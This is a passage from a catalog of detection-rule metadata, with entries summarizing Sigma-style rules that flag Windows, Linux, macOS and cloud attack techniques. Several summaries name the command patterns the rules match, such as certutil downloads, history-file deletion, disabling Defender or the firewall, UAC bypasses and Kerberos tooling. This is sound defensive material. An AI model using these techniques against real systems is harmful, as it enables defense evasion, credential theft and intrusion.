    data. The detection specifically excludes paths associated with known legitimate
    configurations to reduce false positives, ensuring that normal administrative
    actions do not trigger unnecessary alerts.
  Updated-Date: '2024_09_04'
114de787-4eb2-48cc-abdb-c0b449f93ea4:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c7965e86fc0b621702885bd00f7e2dfe
  Ruleset: sigmahq
  Summary: This rule detects the use of the `X509Enrollment.CBinaryConverter` class
    or a specific GUID, which may suggest the abuse of X509Enrollment in Windows environments.
    This behavior is often indicative of attempts to evade defenses or bypass security
    mechanisms, as it is related to digitally signing code or certificates in a potentially
    malicious manner. The rule helps identify suspicious process creations that might
    signify such activities.
  Updated-Date: '2024_09_04'
114e7f1c-f137-48c8-8f54-3088c24ce4b9:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 846b5b3366134dc5355f668e416dc497
  Ruleset: core
  Summary: This rule detects the silent installation of the AnyDesk Remote Desktop
    application by examining process creation logs on Windows devices. It specifically
    looks for command-line arguments including '--install', '--start-with-win', and
    '--silent'. AnyDesk can be used by attackers to gain unauthorized remote access
    to a system, making such installations a potential security concern.
  Updated-Date: '2024_09_03'
115fdba9-f017-42e6-84cf-d5573bf2ddf8:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d53c7c64e6191ea8f4af55543b1862ba
  Ruleset: core
  Summary: "This rule detects the usage of PowerShell cmdlets aimed at disabling or\
    \ removing Event Tracing for Windows (ETW) trace sessions. ETW is a framework\
    \ used for performance and diagnostic tracing of Windows-based systems. The rule\
    \ monitors for specific script block text patterns that indicate attempts to use\
    \ the `Remove-EtwTraceProvider` or to modify the \u201CEnable\u201D property of\
    \ an ETW trace provider with `Set-EtwTraceProvider` to specific values. Detecting\
    \ such actions is essential as they may signify attempts to evade defenses or\
    \ obscure evidence of malicious activities by tampering with system event logging."
  Updated-Date: '2024_09_03'
117d3d3a-755c-4a61-b23e-9171146d094c:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0611417d17ef9db42a817c1042e28b35
  Ruleset: core
  Summary: This rule detects the creation of a macro file for Microsoft Outlook. Specifically,
    it monitors for the creation of the file 'VbaProject.OTM' in the Outlook directory,
    which is indicative of potentially malicious activity aimed at persistence or
    command-and-control. This detection seeks to uncover attempts to establish a backdoor
    through the use of VBA (Visual Basic for Applications) macros in Outlook.
  Updated-Date: '2024_09_03'
1182f3b3-e716-4efa-99ab-d2685d04360f:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8e599e0609235df1334a05b808070f57
  Ruleset: core
  Summary: This rule detects the deletion of history files, such as the ~/.bash_history
    file, which can be an attempt to remove evidence of malicious activity. It identifies
    when commands associated with file deletion, like '/rm', '/unlink', or '/shred',
    are used, and specifically monitors for command lines that include or end with
    patterns indicative of history files.
  Updated-Date: '2024_09_03'
1193d960-2369-499f-a158-7b50a31df682:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6d440e7f58fe0c9e0f959594ca9e9eb0
  Ruleset: sigmahq
  Summary: This rule detects the launch of a browser process or browser tab originating
    from a document-handling application, such as Adobe Acrobat Reader or Microsoft
    Office, which then connects to a web application over HTTP or HTTPS. This activity
    may suggest a potential phishing attempt.
  Updated-Date: '2024_09_04'
11b1ed55-154d-4e82-8ad7-83739298f720:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1ee48fdb6e5dc2ba42d5e4ad712e0f22
  Ruleset: core
  Summary: This rule detects the creation of a file named "ntds.dit" (Active Directory
    Database) by an uncommon process or a process located in a suspicious directory.
    The specific processes monitored include commonly abused scripting and execution
    binaries such as cmd.exe, cscript.exe, mshta.exe, powershell.exe, pwsh.exe, regsvr32.exe,
    rundll32.exe, wscript.exe, wsl.exe, and wt.exe. Additionally, it checks if these
    processes are running from directories typically associated with suspicious activity,
    such as AppData, Temp, Public, and PerfLogs.
  Updated-Date: '2024_09_03'
11b52f18-aaec-4d60-9143-5dd8cc4706b9:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 08c8d4a2d1214da23e52931b4d5354ef
  Ruleset: sigmahq
  Summary: This rule detects obfuscated PowerShell activity initiated through the
    RUNDLL launcher on Windows systems. It focuses on identifying events recorded
    by the Service Control Manager, specifically targeting Event ID 7045 where the
    ImagePath contains rundll32.exe, shell32.dll, shellexec_rundll, and powershell.
    This combination is indicative of potentially malicious attempts to disguise or
    execute PowerShell scripts covertly, aligning with techniques for defense evasion
    and execution outlined in attack techniques T1027 and T1059.001.
  Updated-Date: '2024_09_04'
11c767ae-500b-423b-bae3-b234450736ed:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: cee393dfe45db4eac9ed0d90f7247b69
  Ruleset: core
  Summary: This rule detects when users are added to global or device admin roles
    within Azure environments. Such activity is indicative of defense evasion or privilege
    escalation tactics, as unauthorized users gaining admin privileges can compromise
    security. The event is monitored through audit logs, specifically looking for
    operations involving the addition of members to specified admin roles. This is
    crucial for promptly identifying and responding to potential security breaches.
  Updated-Date: '2024_09_03'
1228c958-e64e-4e71-92ad-7d429f4138ba:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9170aca442b6408d16599e51f70a2d99
  Ruleset: core
  Summary: This rule detects the execution of script interpreters from suspicious
    folders on Windows systems. It monitors the creation of processes like 'cscript.exe',
    'mshta.exe', and 'wscript.exe', and flags them when they are executed with certain
    command line arguments indicative of potentially malicious activity. The rule
    focuses on scripts executed from temporary folders or user-specific directories
    that are often targeted by malware for storing and executing nefarious scripts.
    Such folders include paths within '\Perflogs\', '\Users\Public\', '\AppData\Local\Temp',
    and similar directories. The intent is to identify and alert on unusual activity
    that could signify the presence of malicious scripts leveraging environment variables
    and temporary storage locations to avoid detection.
  Updated-Date: '2024_09_03'
1228f8e2-7e79-4dea-b0ad-c91f1d5016c1:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 25977f4d0edc5e8615e5389b7ea8b7eb
  Ruleset: emerging-threats
  Summary: This rule detects the presence of a malicious service associated with the
    Turla PNG dropper, an advanced persistent threat attributed to the Turla group.
    The service in question, named 'WerFaultSvc', is identified through specific event
    logs generated by the Service Control Manager on Windows systems. The detection
    method relies on monitoring for Event ID 7045 to ascertain the installation of
    this service. This activity aligns with persistence techniques commonly employed
    by the Turla group to maintain long-term access on compromised systems.
  Updated-Date: '2024_09_03'
1277f594-a7d1-4f28-a2d3-73af5cbeab43:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 71f1fd9f94f9ef4b3985eab37f0f595f
  Ruleset: core
  Summary: This rule detects Windows shell and scripting applications, such as `bash.exe`,
    `cmd.exe`, `cscript.exe`, `msbuild.exe`, `powershell.exe`, `pwsh.exe`, `sh.exe`,
    and `wscript.exe`, writing files to suspicious folders like `C:\PerfLogs\` and
    `C:\Users\Public\`. It also identifies other tools like `certutil.exe`, `forfiles.exe`,
    `mshta.exe`, `schtasks.exe`, `scriptrunner.exe`, and `wmic.exe` when they perform
    similar file write operations to `C:\PerfLogs\`, `C:\Users\Public\`, or `C:\Windows\Temp\`.
    This behavior is often associated with malicious activities and can indicate an
    attempt to execute unauthorized scripts or commands on a Windows system.
  Updated-Date: '2024_09_03'
12827a56-61a4-476a-a9cb-f3068f191073:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3cb6f0006cc4362d9608c35873a61a93
  Ruleset: core
  Summary: This rule detects the execution of KrbRelayUp, a hack tool used to exploit
    a universal no-fix local privilege escalation vulnerability in Windows domain
    environments where LDAP signing is not enforced. It monitors for the presence
    of KrbRelayUp.exe either by its image name or original file name and specific
    command-line arguments associated with its malicious operations, including terms
    like `relay`, `-Domain`, and `-ComputerName`, as well as other commands indicative
    of KrbRelayUp activity such as `krbscm`, `-sc`, `spawn`, `-d`, and `-cn`.
  Updated-Date: '2024_09_03'
128faeef-79dd-44ca-b43c-a9e236a60f49:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 02f503ae88bdac6885f16938f3ce08bf
  Ruleset: core
  Summary: This rule detects sign-ins with properties that are unfamiliar to the user
    by analyzing past sign-in history to identify anomalous activities. It is designed
    to flag unusual login characteristics, such as using a new device, location, or
    browser, which might indicate a security risk. Such sign-ins are monitored under
    the assumption that if the login properties do not match the established historical
    patterns, they may warrant further investigation.
  Updated-Date: '2024_09_03'
129966c9-de17-4334-a123-8b58172e664d:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a3645f0b692b133797c31dfe1f07a186
  Ruleset: core
  Summary: "This rule detects attempts to bypass Windows Defender Antivirus by renaming\
    \ the tool `procdump`\u2014typically used for creating process dumps\u2014to `dump64.exe`\
    \ and placing it within the Microsoft Visual Studio folder. The detection focuses\
    \ on identifying the file location and name pattern, as well as specific command-line\
    \ arguments associated with `procdump`, such as options for generating full or\
    \ mini dumps."
  Updated-Date: '2024_09_03'
12b8e9f5-96b2-41e1-9a42-8c6779a5c184:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ad8a3dde52162ed4e8ed2f8745059afc
  Ruleset: sigmahq
  Summary: This rule detects potentially suspicious executions of the "PDQDeployRunner,"
    part of the PDQDeploy service stack responsible for executing commands and packages
    on remote machines. The detection focuses on instances where the parent process
    is related to "PDQDeployRunner" and the child processes include specific executables
    such as '\bash.exe', '\cmd.exe', or contain paths like ':\ProgramData\' and ':\Windows\TEMP\'.
    Additionally, it looks for command lines containing terms indicating encoded or
    hidden commands, such as ' -decode ', ' -enc ', or 'DownloadString'. The rule
    is designed to identify abnormal or unauthorized use of PDQDeploy that may indicate
    malicious activity.
  Updated-Date: '2024_09_04'
12ba6a38-adb3-4d6b-91ba-a7fb248e3199:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c070ecf118b119f15f90970b3848a2ed
  Ruleset: sigmahq
  Summary: This rule detects when an attempt is made to enumerate the password policy
    on a Windows system. It identifies specific events where a handle was requested
    to the Security Account Manager with read access to password parameters. The key
    indicators include Event ID 4661 and the presence of the ReadPasswordParameters
    access type.
  Updated-Date: '2024_09_04'
12d027c3-b48c-4d9d-8bb6-a732200034b2:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e2a490ceeef63783ebadd6c452b1f0f4
  Ruleset: sigmahq
  Summary: This rule detects when a service account is modified or deleted within
    an Azure Kubernetes Service (AKS) environment. The activity is identified by monitoring
    specific operations such as write, delete, or impersonate actions on service accounts.
    While legitimate modifications may be performed by system administrators, unauthorized
    changes or deletions can indicate potential security threats and should be investigated.
  Updated-Date: '2024_09_04'
12e6d621-194f-4f59-90cc-1959e21e69f7:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 65f4dee88e79c842b5b12936c6d440d9
  Ruleset: core
  Summary: This rule detects the potential use of Rubeus by identifying newly registered
    trusted logon processes. Specifically, it focuses on Event ID 4611 within Windows
    Security logs where the logon process name is 'User32LogonProcesss'. Rubeus is
    a post-exploitation tool used for Kerberos-related operations, such as ticket
    extraction and manipulation, and its presence may indicate lateral movement or
    privilege escalation activities within a network. Detection of such events can
    be critical for identifying unauthorized access attempts and mitigating security
    risks.
  Updated-Date: '2024_09_03'
12f6b752-042d-483e-bf9c-915a6d06ad75:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 29df17e5036401108798de20450ca22e
  Ruleset: sigmahq
  Summary: This rule detects attempts to disable the Windows Firewall using PowerShell.
    It monitors for specific process creation events where the PowerShell executable
    or related files (such as 'powershell.exe', 'pwsh.exe', 'powershell_ise.exe',
    or 'pwsh.dll') execute commands containing 'Set-NetFirewallProfile', '-Enabled',
    and 'False'. Optional parameters include '-All', 'Public', 'Domain', or 'Private'.
    This activity is indicative of a defense evasion technique aimed at disabling
    the firewall, which could potentially expose the system to greater security risks.
  Updated-Date: '2024_09_04'
12fbff88-16b5-4b42-9754-cd001a789fb3:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a17c0963d8bc9bde7c75affdf0d19360
  Ruleset: sigmahq
  Summary: This rule detects the modification of the CodePage to the Russian language
    using the utility "mode.com." It specifically identifies the use of this behavior,
    which has been associated with threat actors behind the Dharma ransomware. By
    monitoring the process creation logs for "mode.com" executions that alter the
    CodePage, the rule aims to identify potential defense evasion tactics that involve
    setting the CodePage to either the ANSI Cyrillic (Windows) or OEM Russian (DOS)
    encoding formats. This technique has been observed in real-world ransomware and
    other malware activities.
  Updated-Date: '2024_09_04'
130c9e58-28ac-4f83-8574-0a4cc913b97e:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 307035d8a34d76643db79c37ba054366
  Ruleset: core
  Summary: This rule detects files associated with potential Winnti dropper activity
    on Windows systems. Specifically, it identifies filenames ending with '\gthread-3.6.dll',
    '\sigcmm-2.4.dll', and '\Windows\Temp\tmp.bat'. These filenames are known to be
    used by the Winnti group, as described in the RedMimicry Winnti playbook. Winnti
    is a threat group known for its advanced persistent threat (APT) campaigns, often
    using these specific files to evade detection and perform malicious activities.
  Updated-Date: '2024_09_03'
1321dc4e-a1fe-481d-a016-52c45f0c8b4f:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 147b9068608baed42ce6a7bf5580867c
  Ruleset: sigmahq
  Summary: This rule detects changes made to Windows Defender exclusions by identifying
    events where the antimalware platform configuration has been altered, specifically
    focusing on the addition of exclusions in the Windows Defender settings.
  Updated-Date: '2024_09_04'
1327381e-6ab0-4f38-b583-4c1b8346a56b:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8fb5b3a38124261f7507ff403888d924
  Ruleset: sigmahq
  Summary: This rule detects potential evasion or obfuscation attempts using deceptive
    path traversal via the command line on Windows systems. It identifies instances
    where path traversal sequences such as '\..\Windows\', '\..\System32\', or '\..\..\'
    are present in the command line, which may indicate efforts to access directories
    in a misleading manner. Specific exceptions include legitimate usage by Google
    Drive and Citrix Virtual Smart Card applications to reduce false positives. This
    helps in identifying potentially malicious activities aimed at bypassing security
    controls by manipulating file paths.
  Updated-Date: '2024_09_04'
138d3531-8793-4f50-a2cd-f291b2863d78:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 03b88a80a9165841f67bc2916a6e2d15
  Ruleset: core
  Summary: This rule detects modifications to service paths executed via the "sc"
    binary to suspicious commands or paths. It focuses on identifying when commands
    like 'config' and 'binPath' are used alongside potentially malicious executables
    such as 'powershell', 'cmd', 'mshta', 'wscript', 'cscript', 'rundll32', 'svchost',
    and 'dllhost', or specific command arguments like 'cmd.exe /c', '/k', or '/r'.
    Additionally, it checks for suspicious paths such as 'C:\Users\Public', '\Downloads\',
    '\Desktop\', 'C:\Windows\TEMP\', and locations within the '\AppData\Local\Temp'
    directory. The context includes detecting persistence mechanisms or privilege
    escalation attempts by altering service configurations to use these potentially
    harmful commands or paths.
  Updated-Date: '2024_09_03'
139bdd4b-9cd7-49ba-a2f4-744d0a8f5d8c:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2392756589c74b00ae4002b8168c8fbd
  Ruleset: sigmahq
  Summary: This rule detects when a new admin role assignment is created in Okta,
    which could indicate potential privilege escalation or persistence within the
    system. Such events might result from unauthorized actions or configuration changes
    that elevate user privileges, posing security risks.
  Updated-Date: '2024_09_04'
13acf386-b8c6-4fe0-9a6e-c4756b974698:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5a681044f0f8553dfd4659d82d35df45
  Ruleset: core
  Summary: This rule detects remote PowerShell sessions by monitoring network connections
    to Windows Remote Management (WinRM) ports 5985 and 5986. It identifies these
    activities through security event logs with EventID 5156. This can potentially
    indicate PowerShell remoting activity, which is commonly utilized for remote command
    execution. While such connections may be legitimate, they could also represent
    unauthorized access and execution if not properly managed and monitored.
  Updated-Date: '2024_09_03'
13addce7-47b2-4ca0-a98f-1de964d1d669:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 98b1c6fd22d52dcaf4ff7d4ceb0342d3
  Ruleset: sigmahq
  Summary: This rule detects non-system users failing to get a handle on the Service
    Control Manager (SCM) database on Windows systems. It specifically looks for Event
    ID 4656, where the object type is 'SC_MANAGER OBJECT' and the object name is 'ServicesActive'
    with a particular access mask. The rule aims to identify potential malicious activity
    or misconfigurations, as legitimate actions should not typically result in such
    failures.
  Updated-Date: '2024_09_04'
13c02350-4177-4e45-ac17-cf7ca628ff5e:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 82f97bd24f05c0f1257667d9b3a03ee2
  Ruleset: sigmahq
  Summary: This rule detects the creation of files with the ".dll" extension named
    after System DLLs, such as 'secur32.dll' or 'tdh.dll,' in uncommon or unexpected
    locations outside of standard directories like "System32" or "SysWOW64." This
    behavior may indicate malicious activity attempting to evade defense mechanisms
    by using familiar DLL names in directories not typically associated with system
    files. It is advised to establish a baseline before implementing this rule in
    a production environment to reduce false positives, as third-party software might
    also use specific versions of system DLLs.
  Updated-Date: '2024_09_04'
13db8d2e-7723-4c2c-93c1-a4d36994f7ef:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 715b542b9121b14da3d6b749a4bdbac4
  Ruleset: sigmahq
  Summary: This rule detects potential in-memory downloading and compiling of applets
    on macOS systems by identifying the use of the `curl` and `osacompile` commands
    together. Such behavior has been observed in XCSSET malware, which utilizes these
    commands to execute malicious activities.
  Updated-Date: '2024_09_04'
13e6fe51-d478-4c7e-b0f2-6da9b400a829:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: dff717409c1caae88798a5eda3f67236
  Ruleset: core
  Summary: This rule detects the execution of `certutil` with specific command line
    flags such as `urlcache` and `verifyctl` that allow the utility to download files
    directly from IP addresses. The focus is on identifying when `certutil.exe` is
    used to download files via direct IP access, which is often a tactic employed
    by threat actors to evade detection. Specific URL patterns within the command
    line are monitored to distinguish suspicious downloads while accounting for legitimate
    use cases such as downloads from approved sources like 7-Zip's official site.
  Updated-Date: '2024_09_03'
13f81a90-a69c-4fab-8f07-b5bb55416a9f:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 364565f014d61309cf0df8707f8e8f95
  Ruleset: sigmahq
  Summary: This rule detects when a service account is either disabled or deleted
    in Google Cloud. Such actions are captured through Google Cloud audit logs, specifically
    monitoring for method names that end with ".serviceAccounts.disable" or ".serviceAccounts.delete."
    This detection helps identify potential impacts on cloud operations aligned with
    known adversarial tactics. It is important to scrutinize actions by system administrators
    and investigate changes by any unfamiliar users to avoid unwarranted disruptions
    or unauthorized activities.
  Updated-Date: '2024_09_04'
13fc89a9-971e-4ca6-b9dc-aa53a445bf40:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: feb6b08d0a4d4201609877eaafc7f7cb
  Ruleset: core
  Summary: This rule detects when a DHCP server has loaded a specified Callout DLL,
    as indicated in the registry settings. This activity is captured by monitoring
    for Event ID 1033 from the Microsoft-Windows-DHCP-Server provider in the system
    logs. Loading Callout DLLs by a DHCP server can be associated with certain types
    of attacks, specifically defense evasion tactics.
  Updated-Date: '2024_09_03'
1412aa78-a24c-4abd-83df-767dfb2c5bbe:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0e1d89d80455599f80a9599dc2ef9f13
  Ruleset: sigmahq
  Summary: This rule detects potentially suspicious execution of LNK files that are
    accessed on a WebDAV server. It identifies instances where commonly exploited
    executables such as cmd.exe, cscript.exe, mshta.exe, powershell.exe, pwsh.exe,
    or wscript.exe are executed from a location that includes '\DavWWWRoot\' in the
    command line, with explorer.exe acting as the parent process. This behavior may
    indicate an attempt to execute malicious scripts or commands using WebDAV as a
    vector.
  Updated-Date: '2024_09_04'
1444443e-6757-43e4-9ea4-c8fc705f79a2:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9b27ab5980923a2f5d1909c41036e1f5
  Ruleset: core
  Summary: This rule detects the use of the bcdedit.exe command to tamper with the
    boot configuration data on Windows systems. Such tampering is often employed by
    malware or attackers as a preliminary destructive action before deploying ransomware.
    The rule identifies specific conditions where bcdedit.exe is used with command-line
    arguments like 'bootstatuspolicy' set to 'ignoreallfailures' or 'recoveryenabled'
    set to 'no'. This detection is essential for identifying potentially malicious
    modifications to the boot configuration, which could indicate an imminent ransomware
    attack.
  Updated-Date: '2024_09_03'
145095eb-e273-443b-83d0-f9b519b7867b:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: bba471f2a10f58a2bffb731c892656b6
  Ruleset: sigmahq
  Summary: This rule detects the creation of a file with a ".pdf" extension by the
    "RegEdit.exe" process. This activity suggests that a user is attempting to print
    or save a registry key as a PDF file in an effort to extract sensitive information,
    potentially as a means to bypass security defenses.
  Updated-Date: '2024_09_04'
145322e4-0fd3-486b-81ca-9addc75736d8:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5bce2ab94e9115f5ee984a0507204a40
  Ruleset: sigmahq
  Summary: This rule detects the use of UltraVNC remote access software within a network.
    UltraVNC is a legitimate desktop support and remote access tool that can be used
    by adversaries to establish an interactive command and control channel on target
    systems. The detection focuses on the presence of the UltraVNC VNCViewer executable,
    identified by its description, product name, company name, and original file name.
    Although legitimate use of UltraVNC is possible, this rule aims to identify and
    monitor potentially malicious activity involving this software.
  Updated-Date: '2024_09_04'
146aace8-9bd6-42ba-be7a-0070d8027b76:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c3c9615a28af79f40f9e207ca7ccefe1
  Ruleset: sigmahq
  Summary: This rule detects potentially suspicious child processes spawned by WinRAR.exe.
    It identifies instances where WinRAR.exe creates child processes that are command-line
    interpreters or scripting and utility applications, such as cmd.exe, cscript.exe,
    mshta.exe, powershell.exe, pwsh.exe, regsvr32.exe, rundll32.exe, and wscript.exe.
    The rule is particularly relevant to recognizing potentially malicious activity
    exploiting vulnerabilities associated with WinRAR, specifically CVE-2023-38831.
  Updated-Date: '2024_09_04'
14701da0-4b0f-4ee6-9c95-2ffb4e73bb9a:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6bed8485b2bc8aaf3e1f796118cc7930
  Ruleset: sigmahq
  Summary: This rule detects when a user account on the Okta platform is locked out
    due to exceeding the maximum number of sign-in attempts. This is indicative of
    potential unauthorized access attempts or brute force attacks.
  Updated-Date: '2024_09_04'
148431ce-4b70-403d-8525-fcc2993f29ea:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3dce64eab3fbb7c2ae52a46a3da4f4cd
  Ruleset: sigmahq
  Summary: "This rule detects potential DLL injection and execution using \"Tracker.exe,\"\
    \ which is a legitimate Windows binary known to be utilized for defense evasion.\
    \ The rule identifies instances where \"Tracker.exe\" is invoked with specific\
    \ command-line arguments that indicate potential malicious activity. The detection\
    \ involves checking for the presence of \"Tracker.exe\" and matching certain command-line\
    \ patterns while filtering out benign cases typically related to Microsoft Visual\
    \ Studio\u2019s MSBuild process."
  Updated-Date: '2024_09_04'
14bcba49-a428-42d9-b943-e2ce0f0f7ae6:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: fd9dcd46faef71319ce9b05aff2d81e5
  Ruleset: core
  Summary: This rule detects obfuscated PowerShell scripts launched through the Service
    Control Manager on Windows systems. The detection focuses on specific patterns
    in the ImagePath, particularly those involving environment variable manipulation
    and command execution. Obfuscation techniques may include the use of '&&set',
    'cmd', '/c', and '-f', as well as placeholders like '{0}' through '{5}'. Such
    patterns suggest the use of Invoke-Obfuscation, a tool commonly employed for evading
    security defenses by making PowerShell commands harder to read and analyze. The
    intention is to identify potentially malicious activities that leverage this technique
    for defense evasion and execution.
  Updated-Date: '2024_09_03'
14c71865-6cd3-44ae-adaa-1db923fae5f2:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f90a00257645057363f2fabc81e4f8fc
  Ruleset: sigmahq
  Summary: This rule detects PowerShell scripts attempting to disable scheduled scanning
    and other components of Windows Defender Advanced Threat Protection (ATP) or modify
    default actions to allow potentially harmful actions. The detection focuses on
    specific script blocks that contain commands to disable various features of Windows
    Defender, including real-time monitoring, behavior monitoring, archive scanning,
    intrusion prevention, and other protection mechanisms. Additionally, the rule
    identifies scripts that set default actions for different threat levels to "Allow,"
    potentially compromising system security. This activity is typically suspicious
    and warrants investigation to determine if it is a legitimate administrative task
    or unauthorized tampering.
  Updated-Date: '2024_09_04'
14f3f1c8-02d5-43a2-a191-91ffb52d3015:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 86352d06c8921fd2ed5c9d75c2026bd3
  Ruleset: sigmahq
  Summary: This rule detects changes to the security group entries for RDS databases.
    Such alterations can suggest potential misconfigurations that may expose the database
    to the public internet or a broader audience within the VPC. Additionally, the
    removal of valid rules could affect the availability of the database to authorized
    services and users. The detection leverages AWS CloudTrail logs to identify events
    originating from 'rds.amazonaws.com' related to authorizing, creating, deleting,
    or revoking database security group ingress rules. Real-time monitoring of these
    events can help maintain database security and ensure appropriate access configurations
    are maintained.
  Updated-Date: '2024_09_04'
152f3630-77c1-4284-bcc0-4cc68ab2f6e7:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ea0f786862b45b7f47e667b2909f0c52
  Ruleset: core
  Summary: This rule detects the manipulation of shell open registry keys, specifically
    targeting keys related to exefile and ms-settings for persistence and User Account
    Control (UAC) bypass techniques. It identifies malicious patterns involving the
    use of executable files like fodhelper.exe, computerdefaults.exe, and slui.exe
    through registry key modifications. Such activity is often associated with persistent
    threats or privilege escalation attempts, including techniques detailed in tools
    and methods like UACMe.
  Updated-Date: '2024_09_03'
15434e33-5027-4914-88d5-3d4145ec25a9:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 892bd6bea858061b4c442f3e04d2ec16
  Ruleset: sigmahq
  Summary: This rule detects the execution of the Windows Management Instrumentation
    Command-line (WMIC) tool to obtain a list of installed firewall and antivirus
    products on a system.
  Updated-Date: '2024_09_04'
1543ae20-cbdf-4ec1-8d12-7664d667a825:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c5f0404dac38efdcff05f6aa885ada6c
  Ruleset: sigmahq
  Summary: This rule detects suspicious commands executed on Linux systems that are
    often related to malware or hacking activity. It monitors commands such as 'chmod'
    with arguments '777' and 'u+s', and 'cp' with arguments '/bin/ksh' and '/bin/sh'.
    These commands are atypical and can be associated with attempts to escalate privileges
    or backdoor systems.
  Updated-Date: '2024_09_04'
1547e27c-3974-43e2-a7d7-7f484fb928ec:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7267791c2a204ff998356aafe3c645c6
  Ruleset: sigmahq
  Summary: This rule detects the modification of the Windows registry to allow a driver
    or service to persist in Safe Mode by targeting registry paths associated with
    Safe Mode configurations, specifically under \Control\SafeBoot\Minimal\ and \Control\SafeBoot\Network\.
    It identifies changes involving the default registry values of services set to
    load in these Safe Mode environments. This action can indicate an attempt to ensure
    a service or malware remains operational even when the system is booted into Safe
    Mode, potentially pointing to malicious persistence techniques.
  Updated-Date: '2024_09_04'
155c7fd5-47b4-49b2-bbeb-eb4fab335429:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: bd8be245af756f7fb48cf66e9be890c2
  Ruleset: sigmahq
  Summary: This rule detects the usage of the "Add-WindowsCapability" cmdlet in PowerShell
    scripts to add Windows capabilities, such as "OpenSSH." The focus is on identifying
    instances where specified capabilities are enabled, which could aid in recognizing
    potential misuse or unauthorized installations. Although legitimate administrators
    or users may also use these capabilities, the rule aims to flag any suspicious
    activity adding these specific system features.
  Updated-Date: '2024_09_04'
155dbf56-e0a4-4dd0-8905-8a98705045e8:
  Created-Date: '2024_08_06'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c70b9b321569ea12da1a176d7bfb9967
  Ruleset: core
  Summary: "This rule detects a User Account Control (UAC) bypass that exploits a\
    \ path parsing issue in winsat.exe to achieve privilege escalation. The technique\
    \ involves placing malicious files, such as winsat.exe or winmm.dll, within the\
    \ user\u2019s temp directory path designed to mimic system directories. This method\
    \ is associated with UACMe toolset (specifically method 52), which is used for\
    \ testing UAC bypasses. The detection focuses on file events where the target\
    \ filenames align with paths commonly used in this bypass technique."
  Updated-Date: '2024_09_03'
15619216-e993-4721-b590-4c520615a67d:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
